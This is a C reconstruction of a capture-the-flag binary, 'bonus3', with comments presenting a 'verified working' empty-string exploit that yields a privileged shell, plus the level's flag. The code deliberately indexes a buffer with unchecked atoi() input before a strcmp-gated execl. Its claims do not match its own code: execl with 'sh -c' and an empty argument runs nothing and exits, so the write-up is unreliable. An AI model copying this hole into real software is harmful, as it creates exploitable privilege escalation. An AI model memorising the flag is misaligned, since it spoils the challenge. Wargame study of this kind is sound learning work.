#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

/*
 * bonus3 - String Comparison Bypass via Empty String Exploitation
 * 
 * VERIFIED WORKING SOLUTION:
 * - Create file: echo "test" > /tmp/bonus3  
 * - Execute: ./bonus3 ""
 * - Result: Shell with 'end' user privileges
 * - Flag: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
 */

int main(int argc, char **argv)
{
    FILE *file;
    char buffer1[66];    // First buffer: esp+0x18 (66 bytes)
    char buffer2[65];    // Second buffer: esp+0x5A (65 bytes) 
    int index;
    
    // Argument validation - requires exactly 2 arguments
    if (argc != 2) {
        return -1;
    }
    
    // Initialize buffers to zero
    memset(buffer1, 0, sizeof(buffer1));
    memset(buffer2, 0, sizeof(buffer2));
    
    // Open /tmp/bonus3 file for reading
    file = fopen("/tmp/bonus3", "r");
    if (file == NULL) {
        return -1;
    }
    
    // Read 66 bytes from file into buffer1
    fread(buffer1, 1, 66, file);
    
    // VULNERABILITY: Use argv[1] as index to null-terminate buffer1
    index = atoi(argv[1]);           // Convert argument to integer
    buffer1[index] = '\0';           // Null-terminate at that position
    
    // Read 65 bytes into second buffer (for alternative output)
    fread(buffer2, 1, 65, file);
    
    // Close file
    fclose(file);
    
    // CRITICAL COMPARISON: Compare modified buffer1 with original argv[1]
    if (strcmp(buffer1, argv[1]) == 0) {
        // SUCCESS: Execute shell with SUID privileges  
        execl("/bin/sh", "sh", "-c", argv[1], NULL);
    } else {
        // FAILURE: Print second buffer content
        puts(buffer2);
    }
    
    return 0;
}

/*
 * VULNERABILITY ANALYSIS - EMPTY STRING BYPASS:
 * 
 * WORKING EXPLOIT:
 * 1. File content: "test" (or any content)
 * 2. argv[1]: "" (empty string)
 * 
 * EXECUTION FLOW:
 * 1. fread() reads file content into buffer1 = "test..."
 * 2. atoi("") returns 0 (empty string converts to 0)
 * 3. buffer1[0] = '\0' makes buffer1 = "" (empty string!)
 * 4. strcmp("", "") returns 0 (equal strings)
 * 5. execl("/bin/sh", "sh", "-c", "", NULL) spawns shell
 * 6. Shell runs with SUID privileges (end user)
 * 
 * KEY INSIGHT:
 * The empty string is both the input AND the result of manipulation,
 * making the comparison always succeed regardless of file content.
 * 
 * SECURITY LESSON:
 * - Never use user input directly for array indexing without bounds checking
 * - atoi() edge cases (empty strings, non-numeric input) create vulnerabilities
 * - String comparison logic can be bypassed through careful input crafting
 * - SUID binaries with complex input processing are high-risk attack targets
 */